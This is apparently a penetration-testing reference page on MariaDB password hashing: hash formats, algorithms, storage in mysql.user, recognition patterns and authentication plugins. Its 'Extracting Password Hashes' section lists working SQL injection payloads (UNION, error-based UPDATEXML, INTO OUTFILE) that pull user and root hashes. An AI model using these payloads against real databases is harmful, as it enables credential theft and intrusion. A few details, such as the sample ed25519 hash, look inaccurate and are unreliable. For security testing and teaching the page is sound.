---
title: Password Hashing
description: Understanding MariaDB password hashing algorithms and formats
category: Authentication
order: 23
tags: ["password hashing", "authentication", "security"]
lastUpdated: 2025-12-18
---

## Password Hashing

MariaDB uses different password hashing algorithms depending on the version. Understanding these algorithms is important during SQL injection attacks when attempting to extract and potentially crack user passwords.

### MariaDB Password Hash Evolution

| MariaDB Version | Default Auth Plugin   | Hash Format                     |
| --------------- | --------------------- | ------------------------------- |
| All versions    | mysql_native_password | `*` + `SHA1(SHA1())` (41 chars) |

> **Note:** Unlike MySQL 8.0+ which defaults to `caching_sha2_password`, MariaDB uses `mysql_native_password` across all supported versions (Pre-10.0 through 10.4+). The hash format remains consistent: a 41-character string with `*` prefix followed by the uppercase hex representation of SHA1(SHA1(password)).

#### Checking MariaDB Version

```sql
-- Get full version string
SELECT VERSION() AS version;
-- Returns: '10.11.6-MariaDB-1:10.11.6+maria~ubu2204'

-- Query version variables
SHOW VARIABLES LIKE 'version%';
```

### MariaDB Old Password Algorithm (Pre-4.1)

The old password algorithm used before MySQL/MariaDB 4.1 is a simple 16-byte hash:

```sql
-- Example pre-4.1 password hash for 'password'
SELECT OLD_PASSWORD('password') AS hash
-- Returns: '5d2e19393cc5ef67'
```

This hash is:

- 16 hexadecimal characters
- No prefix
- Very weak (easily cracked)

### MariaDB Standard Password Algorithm

The password algorithm uses double SHA1:

```sql
-- Example standard password hash for 'password'
SELECT PASSWORD('password') AS hash
-- Returns: '*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19'
```

The algorithm:

1. Calculate SHA1(password) = hash1
2. Calculate SHA1(hash1) = hash2
3. Return '\*' + UPPERCASE(HEX(hash2))

#### Manual Hash Generation

You can manually generate the same hash using SHA1 functions:

```sql
-- PASSWORD('x') = '*' + UPPER(HEX(SHA1(SHA1('x'))))
SELECT
  PASSWORD('test') AS pw_hash,
  CONCAT('*', UPPER(SHA1(UNHEX(SHA1('test'))))) AS manual_hash
-- Both return: '*94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29'
```

### Where Password Hashes Are Stored

MariaDB stores password hashes in system tables:

```sql
-- Using authentication_string (recommended)
SELECT User, Host, authentication_string FROM mysql.user;

-- Or using Password column (older versions)
SELECT User, Host, Password FROM mysql.user;
```

### Extracting Password Hashes

When exploiting SQL injection vulnerabilities, password hashes can be obtained:

```sql
-- Via UNION attack
' UNION SELECT User, Password, 3 FROM mysql.user -- -

-- Via subquery extraction
SELECT (SELECT Password FROM mysql.user WHERE User = 'root' LIMIT 1) AS hash

-- Via error-based extraction
' AND UPDATEXML(1,CONCAT('~',(SELECT Password FROM mysql.user WHERE User='root' LIMIT 1),'~'),1) -- -

-- GROUP_CONCAT multiple hashes
SELECT GROUP_CONCAT(CONCAT(User, ':', Password)) AS hashes
FROM (SELECT User, Password FROM mysql.user LIMIT 5) AS limited_users

-- Via outfile (requires FILE privilege)
' UNION SELECT User, Password, 3 FROM mysql.user INTO OUTFILE '/tmp/hashes.txt' -- -
```

> **Note:** Once hashes are extracted, see [Password Cracking](/mariadb/password-cracking) for techniques to crack these hashes using tools like Hashcat and John the Ripper.

### Password Hash Format Examples

```text
-- Pre-4.1 hash for 'password' (16 hex chars)
5d2e19393cc5ef67

-- MariaDB 4.1+ standard hash for 'password' (* prefix, 41 chars)
*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19

-- ed25519 hash format (base64-encoded, MariaDB 10.1.22+)
VxvQhxjLHDOZ9zMX1bK7
```

### Hash Format Recognition

Use regex patterns to identify hash types:

| Hash Type   | Pattern                 | Length | Example                                     |
| ----------- | ----------------------- | ------ | ------------------------------------------- |
| Pre-4.1     | `^[0-9a-f]{16}$`        | 16     | `5d2e19393cc5ef67`                          |
| 4.1+ Native | `^\*[0-9A-F]{40}$`      | 41     | `*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19` |
| ed25519     | `^[A-Za-z0-9+/=]{20,}$` | ~20+   | `VxvQhxjLHDOZ9zMX1bK7`                      |

```sql
-- Distinguish hash types programmatically
SELECT
  CASE
    WHEN Password LIKE '*%' AND LENGTH(Password) = 41 THEN '4.1+ native'
    WHEN LENGTH(Password) = 16 AND Password REGEXP '^[0-9a-f]+$' THEN 'pre-4.1'
    ELSE 'unknown'
  END AS hash_type,
  Password
FROM mysql.user
```

### Special Password Values

MariaDB uses special values for certain account states:

```text
-- Empty string: User can connect without password
''

-- No password / invalid account:
NULL

-- Account locked (invalid password marker):
'*THISISNOTAVALIDPASSWORDHASH*'

-- Pre-4.1 locked account:
'*LK*'
```

#### Checking for Locked Accounts

```sql
-- MariaDB 10.4+ has account_locked column
SELECT User, Host, account_locked FROM mysql.user WHERE account_locked = 'Y'

-- Check for invalid password markers
SELECT User, Host, Password FROM mysql.user
WHERE Password IN ('*THISISNOTAVALIDPASSWORDHASH*', '*LK*')
```

### Dual Password Mechanism

MariaDB can maintain compatibility with old password hashes:

```sql
-- Check old_passwords setting
SHOW VARIABLES LIKE 'old_passwords'

-- Check default authentication plugin
SHOW VARIABLES LIKE 'default_authentication_plugin'

-- List available authentication plugins
SELECT PLUGIN_NAME FROM information_schema.plugins
WHERE PLUGIN_TYPE = 'AUTHENTICATION'
```

### Functions to Generate Password Hashes

MariaDB provides several functions to create and work with password hashes:

```sql
-- Standard MariaDB password hash
SELECT PASSWORD('mypassword')
-- Returns: '*XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX' (41 chars)

-- Pre-4.1 hash (deprecated, weak)
SELECT OLD_PASSWORD('mypassword')
-- Returns: 16 hex characters
```

#### Cryptographic Hash Functions

```sql
-- SHA1 (40 hex characters) - used in mysql_native_password
SELECT SHA1('password') AS hash
-- Returns: '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8'

-- SHA2 with varying bit lengths (stronger than SHA1)
SELECT SHA2('password', 256) AS sha256_hash
-- Returns: '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8' (64 hex characters)

SELECT SHA2('password', 512) AS sha512_hash
-- Returns: 128 hex characters

-- MD5 (32 hex characters) - weak, often used by apps
SELECT MD5('password') AS hash
-- Returns: '5f4dcc3b5aa765d61d8327deb882cf99'
```

#### Binary Conversion Functions

```sql
-- UNHEX converts hex string to binary
SELECT UNHEX('48454C4C4F') AS binary_data
-- Returns: binary 'HELLO'

-- HEX converts binary to hex string
SELECT HEX('HELLO') AS hex_string
-- Returns: '48454C4C4F'

-- Round-trip conversion (useful for hash manipulation)
SELECT HEX(UNHEX(SHA1('test'))) AS reconverted
-- Returns: same as SHA1('test')

-- Verify round-trip conversion matches original
SELECT SHA1('test') AS original, HEX(UNHEX(SHA1('test'))) AS reconverted;
```

### MariaDB Authentication Plugins

MariaDB supports multiple authentication plugins:

| Plugin                | Description                        |
| --------------------- | ---------------------------------- |
| mysql_native_password | Default - SHA1(SHA1()) based       |
| ed25519               | EdDSA signature (MariaDB 10.1.22+) |
| gssapi                | Kerberos/SSPI authentication       |
| pam                   | PAM authentication                 |
| unix_socket           | OS user matching                   |

### Checking Authentication Method

```sql
SELECT User, Host, plugin FROM mysql.user;
```

### Password Hash Security Considerations

1. SHA1-based hashes are vulnerable to rainbow tables (no salt)
2. MariaDB's `ed25519` plugin is more secure than mysql_native_password
3. Some MariaDB server configurations may still allow legacy authentication

#### Password Policy Plugin

MariaDB can enforce password policies via the `simple_password_check` plugin:

```sql
-- Check if simple_password_check plugin is installed
SELECT PLUGIN_NAME, PLUGIN_STATUS FROM information_schema.plugins
WHERE PLUGIN_NAME LIKE '%password%'

-- Query password policy variables (if plugin is enabled)
SHOW VARIABLES LIKE 'simple_password_check%'
```

| Variable                                | Description                |
| --------------------------------------- | -------------------------- |
| simple_password_check_digits            | Minimum required digits    |
| simple_password_check_letters_same_case | Minimum same-case letters  |
| simple_password_check_minimal_length    | Minimum password length    |
| simple_password_check_other_characters  | Minimum special characters |

### Notes for Penetration Testers

- Password policies are not enforced at the database level by default
- Password hashes can be transferred between servers of the same version
- Users with INSERT privilege on mysql.user can potentially add new users
- MariaDB uses mysql_native_password by default, unlike MySQL 8.0
- Some apps store passwords in their own tables, often with weaker hashing

#### Check for Users Without Passwords

```sql
-- Find accounts with empty or NULL passwords
SELECT User, Host FROM mysql.user
WHERE Password = '' OR Password IS NULL

-- Alternative using authentication_string
SELECT User, Host FROM mysql.user
WHERE authentication_string = '' OR authentication_string IS NULL
```

#### Check for Weak Authentication Plugins

```sql
-- Find users with potentially weaker auth methods
SELECT User, Host, plugin FROM mysql.user
WHERE plugin IN ('mysql_old_password', 'mysql_native_password')

-- Check for ed25519 support (stronger alternative)
SELECT PLUGIN_NAME FROM information_schema.plugins
WHERE PLUGIN_NAME = 'ed25519'
```

#### Application Password Storage

Applications often store passwords in their own tables with varying security:

```sql
-- Check application user tables for password storage
SELECT username, password FROM users LIMIT 1

-- Identify hash algorithm by length
-- MD5 = 32 chars, SHA1 = 40 chars, SHA256 = 64 chars, bcrypt = 60 chars
SELECT
  username,
  LENGTH(password) AS hash_length,
  CASE
    WHEN LENGTH(password) = 32 THEN 'MD5'
    WHEN LENGTH(password) = 40 THEN 'SHA1'
    WHEN LENGTH(password) = 64 THEN 'SHA256'
    WHEN LENGTH(password) = 60 AND password LIKE '$2%' THEN 'bcrypt'
    ELSE 'unknown'
  END AS likely_algorithm
FROM users
```

#### Hash Length Quick Reference

| Length | Algorithm     | Security Level |
| ------ | ------------- | -------------- |
| 16     | Pre-4.1 MySQL | Very weak      |
| 32     | MD5           | Weak           |
| 40     | SHA1          | Weak           |
| 41     | MySQL native  | Weak (no salt) |
| 60     | bcrypt        | Strong         |
| 64     | SHA256        | Medium         |
| 128    | SHA512        | Medium         |
